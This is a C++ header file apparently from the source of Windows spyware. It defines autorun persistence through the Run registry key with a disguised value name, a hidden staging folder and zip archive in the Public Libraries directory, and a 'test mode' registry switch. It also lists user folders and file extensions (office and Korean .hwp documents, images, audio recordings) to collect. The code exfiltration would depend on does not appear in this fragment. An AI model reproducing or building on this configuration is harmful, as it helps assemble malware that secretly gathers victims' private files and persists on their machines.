#pragma once


#pragma warning(disable: 4819)	// warning C4819: The file contains a character that cannot be represented in the current code page (949). Save the file in Unicode format to prevent data loss
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <iostream>
#include <Windows.h>
#include <regex>
#include <Psapi.h>
#include <regex>
#include "libpng/png.h"
#include <fstream>
#include <chrono>
#include <thread>
#include <filesystem>
#include <ShlObj.h>

namespace fs = std::filesystem;

#define AUTORUN_PATH "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define AUTORUN_VALUE "a2McCq"
#define SAVE_PATH "C:\\Users\\Public\\Libraries\\"
#define COLLECT_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr"
#define ZIP_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr.zip"
#define TEST_MODE "SOFTWARE\\test"
#define TEST_VALUE "TEST_MODE"

/*
0x00 : CSIDL_DESKTOP
0x05 : CSIDL_PERSONAL
0x0D : CSIDL_MYMUSIC
0x0E : CSIDL_MYVIDEO 
*/
const BYTE CSIDL_LIST[] = { 0x0D, 0x0E };

const char* EXTENSIONS[] =
{	".jpg",".jpeg",".png",".gif",".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",
	".pptx",".pdf",".txt",".mp3",".amr",".m4a",".ogg",".aac",".jpg",".jpeg",".png",".gif",
	".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",".pptx",".pdf" };